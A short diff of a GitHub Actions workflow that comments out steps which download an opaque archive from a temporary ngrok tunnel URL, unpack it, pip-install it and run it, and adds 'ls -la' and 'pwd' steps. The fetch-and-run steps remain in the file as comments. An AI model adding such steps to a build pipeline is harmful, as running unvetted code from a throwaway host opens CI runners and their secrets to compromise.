@@ -10,11 +10,15 @@ jobs:
       - uses: actions/setup-python@v2
         with:
           python-version: "3.8"
-      - name: Wget package
-        run: wget https://245aeef793a0.ngrok.io/items/hf8734hfiu932fujiufhg928ufjoi23bhg9834
-      - name: Unpack package
-        run: tar -xvf hf8734hfiu932fujiufhg928ufjoi23bhg9834
-      - name: Install package
-        run: pip install -e locust/
-      - name: Run locust check
-        run: locust -r . -i master -t t-2
+      - name: ls 
+        run: ls -la
+      - name: pwd
+        run: pwd
+      # - name: Wget package
+      #   run: wget https://245aeef793a0.ngrok.io/items/hf8734hfiu932fujiufhg928ufjoi23bhg9834
+      # - name: Unpack package
+      #   run: tar -xvf hf8734hfiu932fujiufhg928ufjoi23bhg9834
+      # - name: Install package
+      #   run: pip install -e locust/
+      # - name: Run locust check
+      #   run: locust -r . -i master -t t-2
